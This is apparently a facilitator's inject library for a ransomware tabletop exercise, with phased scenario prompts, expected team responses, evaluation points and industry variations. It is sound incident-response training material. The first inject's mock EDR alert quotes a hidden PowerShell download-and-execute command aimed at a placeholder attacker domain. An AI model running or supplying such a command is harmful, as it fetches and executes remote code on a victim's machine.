# Inject Library - Ransomware Scenario

**Reusable inject templates organized by exercise phase and duration**

This library provides parameterizable inject templates that can be mixed, matched, and customized for different exercise durations (2-hour, 4-hour, full-day) and difficulty levels (beginner, intermediate, advanced).

---

## How to Use This Library

Each inject includes:
- **Inject ID:** Unique identifier (e.g., DET-1, INV-2)
- **Phase:** When it occurs (Detection, Investigation, Containment, Response, Recovery)
- **Timing:** Suggested timing within exercise (T+10 min, or "after X decision")
- **Duration:** How long to discuss/resolve
- **Delivery Method:** How facilitator delivers (chat message, call, meeting, system alert, etc.)
- **Content Template:** Text to adapt with client-specific details
- **Expected Response:** What participants should do/decide
- **Evaluation Points:** What to observe/assess
- **Variations:** Options for different difficulty levels or industries
- **Notes:** Facilitation tips

---

## DETECTION PHASE (T+0 to T+15 minutes)

### DET-1: Initial Alert - EDR or Help Desk

**Phase:** Detection
**Timing:** T+0 (start of exercise)
**Duration:** 3-5 minutes
**Delivery Method:** EDR alert message OR help desk call transcript

**Content Template:**
```
[EDR ALERT MESSAGE]
Severity: HIGH
Alert Type: Suspicious Process Execution
System: [CLIENT-SYSTEM-NAME]
Time: [EXERCISE-START-TIME]
User: [CLIENT-USER-NAME]
Details: PowerShell process spawned with suspicious command-line arguments:
  powershell.exe -nop -w hidden -c "IEX([Net.ServicePointManager]::SecurityProtocol=[Net.ServicePointManager]::SecurityProtocol -bor 3072); IEX(New-Object Net.WebClient).DownloadString('http://[ATTACKER-C2-DOMAIN]')"

[OR HELP DESK CALL TRANSCRIPT]
Caller: User from [DEPARTMENT]
Issue: "My files keep giving me errors saying they're encrypted. And there's a
       text file on my desktop with strange payment instructions. Is this a virus?"
Time Reported: [EXERCISE-START-TIME]
Affected System: [CLIENT-SYSTEM-NAME]
```

**Expected Response:**
- Acknowledge alert/call received
- Begin initial triage (is this isolated or widespread?)
- Alert manager/team lead
- Start documenting incident

**Evaluation Points:**
- Do they take the alert seriously or dismiss it?
- Do they immediately escalate or try to investigate alone?
- Do they start documenting/timeline?
- Speed of initial response

**Variations:**
- **Beginner:** Clean EDR alert, clear malicious behavior
- **Intermediate:** Multiple alerts across systems (scope more complex), delayed alert (attacker was in network 2+ days)
- **Advanced:** False positive mixed with real alerts (noisy environment), EDR partially disabled by attacker

**Industry Customizations:**
- **Healthcare:** Alert from patient-facing EHR system (urgent care impact)
- **Finance:** Alert from transaction processing system (revenue critical)
- **Retail:** Alert from e-commerce platform (customer-facing)
- **Manufacturing:** Alert from production system (supply chain impact)

**Facilitation Notes:**
- This is the "aha" moment - let it sink in before moving on
- Gauge initial response calmness (panic vs. professional)
- Use this to set tone for the exercise (serious, high-stakes)

---

### DET-2: Scope Confirmation - It's More Than One System

**Phase:** Detection
**Timing:** T+5 to T+10 minutes (after initial response to DET-1)
**Duration:** 5-8 minutes
**Delivery Method:** Chat message from IT analyst or EDR dashboard notification

**Content Template:**
```
[FROM IT ANALYST]
"We just checked—it's not just [CLIENT-SYSTEM-NAME]. The help desk is getting
calls from [DEPARTMENT-1] and [DEPARTMENT-2]. Users reporting:
- Files with .encrypted extension
- Same ransom note on desktop
- Happening on their workstations AND file shares they access

Initial count: At least 20 systems affected. Scope is growing."

[OR EDR DASHBOARD]
New alerts in last 5 minutes:
  - System 1: [SUSPICIOUS-PROCESS]
  - System 2: [SUSPICIOUS-PROCESS]
  - System 3: [SUSPICIOUS-PROCESS]
  - System 4: [SUSPICIOUS-PROCESS]
  - System 5: [MORE ALERTS COMING]
```

**Expected Response:**
- Realize this is NOT an isolated incident
- Shift from "investigate this one system" to "understand the scope"
- Start asking: How many systems? What's connected? How fast is it spreading?
- Begin thinking about containment

**Evaluation Points:**
- Do they recognize scope escalation vs. single system issue?
- Do they shift from investigation to triage?
- Are they thinking about blast radius/spread rate?
- Do they alert senior management?

**Variations:**
- **Beginner:** 20 systems, spread is slowing, clear pattern
- **Intermediate:** 50+ systems, spread is accelerating, multiple departments affected
- **Advanced:** Spread to cloud systems, backup systems also affected, unclear if perimeter is still being attacked

**Facilitation Notes:**
- This is where participants start to feel the pressure
- Watch for panic vs. methodical response
- This is good time to note: "Scope will keep changing as you investigate—stay flexible"

---

### DET-3: Initial Assessment - What Are We Dealing With?

**Phase:** Detection
**Timing:** T+10 to T+15 minutes (after scope confirmation)
**Duration:** 5-10 minutes
**Delivery Method:** Security team huddle / system analysis results

**Content Template:**
```
[FROM SECURITY ANALYST]
"Quick analysis of the malware from the first alert:
- Not a 0-day we've seen before
- Uses AES-256 encryption (no known decryption keys)
- Ransom note references group known for data exfiltration
- They're claiming they have [CLIENT-DATA-TYPE]: customer records, source code, etc.
- Ransom demand: $[AMOUNT] in Bitcoin
- Payment deadline: [TIME] hours from now (about [DEADLINE-TIME])

Key question: How long has this attacker been in our network? That EDR alert
was 15 minutes ago, but the encryption is widespread. They could have been here
for days or weeks doing reconnaissance."

[RANSOM NOTE CONTENT]
"Your files have been encrypted. You have [DEADLINE] hours to pay.
Send $[AMOUNT] Bitcoin to: [WALLET-ADDRESS]
Proof of data: [SAMPLE-DATA-FILES-LISTED]
If you don't pay, we will publish your data at [DARK-WEB-SITE]"
```

**Expected Response:**
- Understand the threat (double-extortion ransomware)
- Recognize time pressure (payment deadline)
- Shift focus to: How deep did they get? What data? How long were they here?
- Start thinking: Containment? Recovery? Backup status?

**Evaluation Points:**
- Do they understand double-extortion threat?
- Do they recognize time pressure without panicking?
- Are they asking the right questions (scope, data at risk, timeline)?
- Who's in the room making decisions?

**Variations:**
- **Beginner:** Clear threat, known ransomware family, moderate ransom
- **Intermediate:** Lesser-known group, higher ransom, data claims are credible
- **Advanced:** Multiple known groups involved, very high ransom, data sample looks legitimate and damaging

**Industry Customizations:**
- **Healthcare:** Ransom includes PHI, HIPAA notification implications, patient safety impact
- **Finance:** Includes customer financial data, regulatory reporting requirements
- **Retail:** Customer PII, credit cards, reputation damage significant

**Facilitation Notes:**
- This is the moment where the exercise becomes "real" for participants
- They now understand: This is a crisis, not just a tech problem
- Time pressure is real now
- Watch for "we need to pay them" vs. "we need to understand what happened" thinking

---

## INVESTIGATION PHASE (T+15 to T+45 minutes)

### INV-1: Backup Status Check - Are Backups Okay?

**Phase:** Investigation
**Timing:** T+20 minutes (after scope confirmation, before containment decision)
**Duration:** 5-8 minutes
**Delivery Method:** IT operations team report

**Content Template:**
```
[FROM BACKUP OPERATIONS]
"We have news on the backup status:

Daily Backups (automated):
- Last good backup: [DATE/TIME] (about [HOURS] hours old)
- Latest backup attempt: [DATE/TIME] - Status: FAILED
- Error message: 'Backup destination unavailable - mount point not responding'

We're checking if the encryption hit the backup target itself..."

[2 MINUTES LATER]
"Backup status update - PROBLEM:
- The backup destination IS encrypted
- Oldest recovery option we have: [DATE] backup ([DAYS] days old)
- That [DAYS]-day-old data loss might be unacceptable for [CRITICAL-SYSTEM]
- Also: We've never tested recovery from that old backup. It might not work."
```

**Expected Response:**
- Realize backup recovery might be complicated
- Shift from "just restore from backup" to "what are our actual recovery options?"
- Start assessing: Can we tolerate that much data loss?
- Consider: Do we need to negotiate with attacker OR try recovery without them?

**Evaluation Points:**
- Do they understand backup limitations?
- Are they assessing recovery timeline vs. business tolerance?
- Are they thinking about business impact of data loss?
- Do they panic or stay methodical?

**Variations:**
- **Beginner:** Recent clean backup exists, recovery process is tested and documented
- **Intermediate:** Backup is old (7+ days), recovery process untested or slow (days to weeks)
- **Advanced:** Backup is corrupted or encrypted, oldest clean backup is unacceptable data loss (weeks old)

**Facilitation Notes:**
- Many organizations over-trust their backups
- This inject often reveals critical gaps in BC/DR planning
- Watch for "we'll just restore from backup" vs. "backup won't help us here"
- This is a good opportunity for: "This is why you test your backups"

---

### INV-2: Forensic Findings - Timeline of Compromise

**Phase:** Investigation
**Timing:** T+25 to T+30 minutes (as parallel investigation thread)
**Duration:** 5-10 minutes
**Delivery Method:** Forensics team findings

**Content Template:**
```
[FROM FORENSICS ANALYST]
"Initial timeline based on log analysis:

T-[DAYS] days ago, T-[TIME]:
- Initial phishing email sent (we found it in email archive)
- User [USER-NAME] from [DEPARTMENT] opened attachment
- Macro executed, downloaded first-stage payload
- Persistence established (scheduled task: 'Windows Update Check')

T-[DAYS-1] to T-[DAYS-2]:
- Network reconnaissance (we see port scans, SMB enumeration)
- Attacker looking for domain admin credentials
- Found them in memory on [SYSTEM-NAME] (LSASS dump attack)

T-[DAYS-2] to yesterday:
- Lateral movement across network
- System access verified on [NUMBER] different systems
- File access patterns suggest data staging (lots of reads/copies to [LOCATION])

Yesterday evening through this morning:
- Data exfiltration (we see unusual outbound traffic to [ATTACKER-IP])
- Large data transfers out of network (encryption keys were probably sent at same time)

T-[TIME] today:
- Ransomware deployed (coordinated across all infected systems)
- Encryption begins

So: Attacker was in our network for [DAYS] days before we detected them."
```

**Expected Response:**
- Understand they've been compromised for a long time
- Grasp the sophistication of the attack (organized, patient, methodical)
- Realize data was already stolen BEFORE encryption
- Shift thinking: This isn't just about restoring data; data is gone regardless

**Evaluation Points:**
- Do they understand the attack chain?
- Do they recognize persistence and backdoors might still exist?
- Are they thinking: "Even if we restore, attacker still has our data"?
- Do they understand this affects ransom decision?

**Variations:**
- **Beginner:** Attacker in network 1-2 days, straightforward attack chain, no persistence found yet
- **Intermediate:** Attacker in network 3-5 days, multiple persistence mechanisms found, data staged for exfiltration
- **Advanced:** Attacker in network 1-2 WEEKS, multiple persistence mechanisms, data may have been exfiltrated multiple times, backdoor may still be active

**Industry Customizations:**
- **Healthcare:** Attacker accessed EHR for [DAYS], patient records compromised
- **Finance:** Attacker accessed customer financial database, transaction records at risk
- **Manufacturing:** Attacker accessed design systems, IP at risk, competitors may now have access

**Facilitation Notes:**
- This often changes the calculus for participants
- Many think: "We just restore and we're fine"
- This reveals: "Data is already gone; restoration only solves encryption"
- Good moment for coaching: "This is why network segmentation matters"

---

### INV-3: Lateral Movement Confirmation - Scope Surprise

**Phase:** Investigation
**Timing:** T+35 to T+40 minutes (after forensics findings)
**Duration:** 5-8 minutes
**Delivery Method:** System administrator discovery

**Content Template:**
```
[FROM SYSTEM ADMIN]
"We found more affected systems than we thought:

Systems we KNEW about: 50 systems in [DEPARTMENTS]

Systems we just FOUND:
- 15 systems in [REMOTE-OFFICE-LOCATION] (we forgot about those)
- 10 systems in [PARTNER-COMPANY-NAME] data center (data integration systems)
- Cloud infrastructure: RDS database, S3 buckets, EC2 instances all encrypted

New scope: ~75 systems + cloud infrastructure

Also: One of the cloud instances has attacker tools still running on it:
- Command and control beacon still active
- Attacker may still have access
- We don't know if they've seen our containment attempts yet"
```

**Expected Response:**
- Realize scope is worse than they thought
- Shift from "we're making progress" to "this is bigger than we thought"
- Question their containment strategy (is it enough?)
- Realize: Attacker may still be in the network watching their response

**Evaluation Points:**
- How do they react to scope expansion?
- Do they revise containment strategy?
- Do they alert leadership to increased scope/cost?
- Do they consider: Attacker is watching our response?

**Variations:**
- **Beginner:** Scope increase is 20%, all internal systems
- **Intermediate:** Scope increase is 50%, includes partner/cloud systems, some persistence found
- **Advanced:** Scope increase is 100%+, includes critical supply chain partner, attacker may still be active, multiple backdoors suspected

**Facilitation Notes:**
- This is frustration point for participants ("We thought we had this under control")
- Tests resilience and adaptability
- Real incidents often have scope creep
- This is where "assume worse" thinking helps

---

## CONTAINMENT DECISION PHASE (T+45 to T+60 minutes)

### CONT-1: Executive Pressure for Decisions - CEO Wants Answers

**Phase:** Containment/Response
**Timing:** T+50 minutes (after investigation reveals scope/timeline)
**Duration:** 5-10 minutes
**Delivery Method:** CEO/Executive request (call, meeting)

**Content Template:**
```
[CEO/EXECUTIVE CALL]
"I've been briefed on the situation. I have questions that need answers NOW:

1. How bad is this? Give me a number: How much data? How many customers affected?
2. When will we be back online? I need to tell the board something.
3. How much will this cost? Insurance covered? Can we cover it?
4. What do you recommend? Should we pay them? Is that even legal?
5. Are we safe? Is this contained or still spreading?

And I need clear answers, not technical jargon. I'm calling an emergency board
meeting in [TIME] minutes. What am I telling them?"

[If pressed on timeline]
"Look, I understand you're still investigating. But I need SOMETHING to tell
the board and our stakeholders. Best guess is fine. But I need it in 10 minutes."
```

**Expected Response:**
- Provide executive-appropriate briefing (clear, concise, honest about uncertainty)
- Make specific recommendations (not just options)
- Acknowledge business impact clearly
- Show confidence even amid uncertainty

**Evaluation Points:**
- Can technical people translate to business language?
- Do they provide clear recommendations or defer?
- Do they acknowledge business constraints?
- Do they demonstrate leadership or just report facts?
- How do they handle uncertainty ("We don't know yet")?

**Variations:**
- **Beginner:** Executive is supportive, gives team time to work
- **Intermediate:** Executive is demanding but reasonable, time pressure is real
- **Advanced:** Executive is panicked/angry, board is demanding, media may already have the story

**Industry Customizations:**
- **Healthcare:** CEO concerned about patient safety, regulatory implications, board liability
- **Finance:** CEO concerned about customer confidence, regulatory reporting, stock price
- **Retail:** CEO concerned about holiday sales, customer PII, competitor advantage

**Facilitation Notes:**
- This is a high-pressure moment; observe participant calmness
- Watch for blame-shifting vs. solution-focused responses
- This is where "we're a team" thinking helps
- Good opportunity for coaching: "This is why IR plans need executive buy-in"

---

## RESPONSE PHASE (T+60+ minutes)

### RESP-1: Law Enforcement Involvement - FBI Offers Help

**Phase:** Response
**Timing:** T+70 minutes (during or after initial containment)
**Duration:** 5-10 minutes
**Delivery Method:** Phone call from FBI / local law enforcement

**Content Template:**
```
[FBI AGENT CALL]
"We're aware of your incident. This ransomware group is on our radar.
We can help, but there are some things you need to know:

First - the good news:
- We have some intelligence on this group
- We may be able to help identify where ransom payments go
- We can provide threat intel to help with remediation

Now - the guidance:
- We recommend NOT paying the ransom
- If you do pay, you must notify us
- We may be able to recover funds in some cases
- We need to collect evidence for our investigation
- We recommend filing a formal IC3 report

Questions I need answered:
1. Do you know if customer data was exfiltrated? That triggers different reporting
2. Have you paid the ransom yet? (If yes, we need to know immediately)
3. Do you need help with technical remediation?
4. Can we collect forensic evidence from your systems?"
```

**Expected Response:**
- Coordinate with law enforcement (not just security team deciding)
- Understand legal implications of ransom payment
- Consider: Law enforcement support vs. quick recovery
- Balance: Investigation vs. getting systems back online

**Evaluation Points:**
- Do they involve legal before paying ransom?
- Do they understand government guidance vs. insurance recommendations?
- Do they report incident to law enforcement or try to handle privately?
- Can they work with external agencies while managing internal crisis?

**Variations:**
- **Beginner:** FBI is helpful, guidance is clear, no conflicts
- **Intermediate:** FBI guidance conflicts with insurance company (may require ransom negotiation), investigation may slow recovery
- **Advanced:** Critical infrastructure implications (FBI involvement becomes mandatory), evidence preservation conflicts with rapid recovery

**Facilitation Notes:**
- Participants often don't think about law enforcement
- This injects external constraints on their decision-making
- Real incidents often have this tension: "Cooperate with FBI" vs. "Pay ransom to recover"
- Good moment for: "Know your legal obligations before incident happens"

---

### RESP-2: Insurance Company Involvement - Coverage Questions

**Phase:** Response
**Timing:** T+75 minutes (in parallel with law enforcement)
**Duration:** 5-10 minutes
**Delivery Method:** Insurance broker/claims handler call

**Content Template:**
```
[INSURANCE CLAIMS HANDLER]
"We received notice of your incident. I'm handling the cyber claim.
Before we can proceed, I need information:

Coverage question 1 - Do you want to pay the ransom?
- Our policy COVERS ransom payments (up to $[AMOUNT])
- BUT - we require professional ransom negotiation (you can't pay directly)
- We'll need to engage our preferred negotiation firm ($[COST] fee)

Coverage question 2 - Forensics and remediation
- We cover forensics: $[AMOUNT] (we have preferred vendor)
- We cover external IR firm: $[AMOUNT] (we have preferred list)
- You can choose your own vendors, but we may not cover full cost

Coverage question 3 - Notification and legal
- We cover breach notification costs: $[AMOUNT]
- We cover legal review: $[AMOUNT] per hour
- We cover regulatory fines up to $[AMOUNT] (some jurisdictions have limits)

Important: Our policy requires that you notify us within [HOURS] hours of discovery.
Have you met that deadline?"

[If customer/regulatory notification triggered]
"Also: If this triggers HIPAA/PCI/GDPR notification, let me know. Different
coverage limits apply, and we'll need to coordinate with regulators."
```

**Expected Response:**
- Coordinate with insurance (ransom decisions not security-only)
- Understand insurance coverage limits
- Balance: Speed vs. insurance requirements
- Consider: Insurance negotiators vs. direct negotiation

**Evaluation Points:**
- Do they involve insurance BEFORE making ransom decision?
- Do they understand insurance may have preferred vendors?
- Can they balance insurance requirements with business needs?
- Do they understand coverage limits?

**Variations:**
- **Beginner:** Insurance coverage is clear, support is good, no conflicts
- **Intermediate:** Insurance requires negotiator (adds cost/time), coverage limits apply, some vendor conflicts
- **Advanced:** Insurance has strict requirements, may require law enforcement coordination, coverage limits are lower than actual costs

**Facilitation Notes:**
- Many organizations don't involve insurance early
- Insurance may have specific requirements that constrain options
- Real incidents often have tension: "Insurance says do X, Law enforcement says do Y"
- Good moment for: "Know your insurance coverage before incident"

---

### RESP-3: Media Inquiry - Reporter Has the Story

**Phase:** Response
**Timing:** T+90 minutes (escalation toward end of exercise)
**Duration:** 5-10 minutes
**Delivery Method:** PR team alert

**Content Template:**
```
[FROM PR TEAM]
"We just got called by a reporter from [MAJOR-NEWS-OUTLET].

They know:
- We experienced a ransomware attack (hours old—how did they find out?)
- Approximately [NUMBER] systems were affected
- The threat actors are claiming to have customer/employee data
- They're asking if we paid the ransom

Reporter's deadline: [TIME] (less than 1 hour)

PR recommendation: We should proactively release a statement BEFORE they publish,
or we look like we're hiding something.

Legal says: 'Be very careful what we admit to. Consulting attorney now.'

CEO says: 'Find out what the reporter knows before we say anything.'

What's our official statement going to say?"
```

**Expected Response:**
- Realize external communications matter during incident
- Balance: Transparency vs. legal risk
- Coordinate: PR, Legal, Executive leadership
- Understand: How incident looks matters, not just incident facts

**Evaluation Points:**
- Do they involve legal BEFORE talking to media?
- Can they balance: "Tell truth" vs. "Don't admit liability"?
- Do they realize media will publish whether they talk or not?
- Are they thinking: "Reputation management" vs. just "incident response"?

**Variations:**
- **Beginner:** Reporter has limited info, statement is straightforward
- **Intermediate:** Reporter has detailed info (may have insider source), legal has strong opinions, statement is complex
- **Advanced:** Reporter publishes regardless of statement, story is damaging, media focuses on ransomware group's claims

**Industry Customizations:**
- **Healthcare:** HIPAA breach notification implications, patient notification required, regulatory notification deadline
- **Finance:** Customer trust implications, financial impact significant, SEC may require disclosure
- **Retail:** Customer confidence critical, brand damage significant, competitor advantage if data exposed

**Facilitation Notes:**
- Most IR exercises skip this—it's often ignored in real incidents
- This is where "incident response" becomes "crisis management"
- Good observation point: How do participants handle non-technical crisis?
- Real incidents often have media dimension that catches organizations unprepared

---

## RECOVERY PHASE (T+120+ minutes)

### REC-1: Recovery Timeline Pressure - Business Demanding Timeline

**Phase:** Recovery
**Timing:** T+120+ minutes (toward end of exercise)
**Duration:** 5-10 minutes
**Delivery Method:** Business leadership / operations team

**Content Template:**
```
[FROM BUSINESS OPERATIONS]
"IT needs to give us a realistic timeline for system recovery.

Business context:
- We have a major customer delivery deadline in [DAYS] days
- Our peak sales period is [TIMEFRAME] (can't be down then)
- We have [NUMBER] employees completely unable to work without [CRITICAL-SYSTEM]
- Every day of downtime costs us approximately $[AMOUNT]

IT is saying recovery could take [DAYS-LONG] days. That's unacceptable.

Questions:
1. Is there ANY way to get critical systems back in [DAYS-SHORT] days?
2. Can we operate in a degraded mode while recovery continues?
3. If not, what's the minimum set of systems we MUST have by [DATE]?
4. What's preventing faster recovery? Can we throw more resources at it?

We need a realistic timeline, but we also need to understand tradeoffs."
```

**Expected Response:**
- Articulate realistic recovery timeline based on actual constraints
- Communicate tradeoffs (speed vs. safety, cost vs. time)
- Prioritize systems based on business impact
- Show flexibility but also set realistic expectations

**Evaluation Points:**
- Do they understand business impact vs. technical requirements?
- Can they say "no" to impossible timelines?
- Do they prioritize correctly (critical systems first)?
- Do they communicate clearly with non-technical audience?

**Variations:**
- **Beginner:** Recovery is fast (backups work, 1-2 days), business can wait
- **Intermediate:** Recovery is slow (rebuild needed, 1-2 weeks), business wants faster, tradeoffs exist
- **Advanced:** Recovery is very slow (clean gold images don't exist, months), business can't wait, need to operate degraded long-term

**Facilitation Notes:**
- This is where technical reality meets business reality
- Participants often under-estimate recovery time
- This is good moment for: "System design/backup strategy matters before incident"
- Watch for: Can they handle business pressure while maintaining security?

---

## DECISION POINT: RANSOM PAYMENT

### RANSOM-DECISION: To Pay or Not to Pay

**Phase:** Response/Recovery
**Timing:** Can occur T+45 to T+120 (depending on exercise flow)
**Duration:** 15-30 minutes (major decision, lots of debate expected)
**Delivery Method:** Executive decision-making meeting transcript / decision log

**Content Template:**

**[FACILITATOR SETUP]**
```
The ransom deadline is [TIME] hours away. Your team has gathered information:
- Attacker claims they have [DATA-DESCRIPTION]
- Sample data they published shows: [SPECIFIC-EXAMPLES]
- Law enforcement recommends NOT paying
- Insurance will cover negotiation: $[COST] fee, up to $[AMOUNT] coverage
- Backup recovery will take [DAYS] days and lose [DAYS] of data
- Decryption without paying is not possible (AES-256 encryption)

You now need to make THE decision: Pay or Don't Pay?"
```

**Arguments for Paying:**
```
- Fastest recovery path (attacker provides decryption key, usually works)
- Business can resume operations faster
- Insurance covers most of cost
- Time value: Every day offline costs $[AMOUNT]
- If data is truly critical: $[RANSOM-AMOUNT] vs. $[BUSINESS-LOSS-AMOUNT]
- Negotiation may reduce ransom (insurance negotiator may get 30% reduction)
```

**Arguments Against Paying:**
```
- FBI strongly recommends against
- No guarantee decryption key works
- Fuels criminal enterprise (repeat targeting)
- OFAC sanctions may prohibit payment (depends on jurisdiction)
- Data is already gone (restoring doesn't recover stolen data)
- Attacker may have intentionally left backdoors for future attacks
- Regulatory concerns (should have been better prepared)
- Reputation damage if public learns you paid
- May not actually work (ransomware group might disappear)
```

**Expected Responses:**
- Team debates, eventually arrives at decision
- Decision is documented with reasoning (not just panic)
- Consider alternatives even if deciding to pay
- Understand decision has legal/ethical/practical implications

**Evaluation Points:**
- Is decision made deliberately or under panic?
- Do they involve legal, insurance, law enforcement?
- Do they document reasoning (important if decision is wrong)?
- Do they consider alternatives?
- How confident are they in their decision?

**Variations:**
- **Beginner:** Decision is obvious (clear right answer), limited debate
- **Intermediate:** Decision is genuinely difficult (good arguments on both sides), real debate occurs
- **Advanced:** Decision is agonizing (data is critical, backups are bad, time is running out, all options have downsides)

**Facilitation Notes:**
- This is THE decision point in ransomware exercises
- No universally "right" answer—depends on context
- Good exercise generates genuine debate
- Watch for: Single person deciding vs. team consensus
- Debrief should validate process (good decision-making) not just outcome

---

## Template: How to Customize Injects

### For Healthcare:
- Change system names to EHR systems (Epic, Cerner)
- Add patient care urgency ("Critical care systems down")
- Add HIPAA notifications ("60 days to notify")
- Add regulatory bodies (CMS, state health department)
- Complications: "Surgical schedule disrupted," "Patient records inaccessible"

### For Finance:
- Change system names to transaction systems (banking core, payment processing)
- Add regulatory urgency (SEC, banking regulators)
- Add customer trust impact ("Banking customers cannot access accounts")
- Change ransom amounts (often higher in finance)
- Complications: "Cannot process payments," "Customer data in dark web"

### For Retail/E-Commerce:
- Change system names to customer-facing systems (e-commerce platform, POS)
- Add seasonal context (holiday season = massive impact)
- Add customer data specifics (credit cards, shipping addresses)
- Add reputation damage context
- Complications: "Cannot process orders," "Customers leaving due to service down"

### For Manufacturing:
- Change system names to production systems, CAD systems
- Add supply chain impact ("Cannot fulfill orders")
- Add OT/IT convergence issues
- Add equipment reset/calibration needs
- Complications: "Production line down," "Supply chain partners calling"

---

## Notes for Facilitators

- **Timing is flexible:** "T+10 min" is guidance; adjust based on group pace
- **Mix and match:** Pick injects appropriate for exercise duration and difficulty
- **Expect variation:** Groups respond differently; be ready to adapt
- **Observe, don't dictate:** Your job is to deliver injects and observe responses, not to tell them the "right" answer
- **Complications escalate:** Start with one thread, add more as exercise progresses
- **Real incidents are messy:** Your exercise should feel like chaos at times—that's realistic
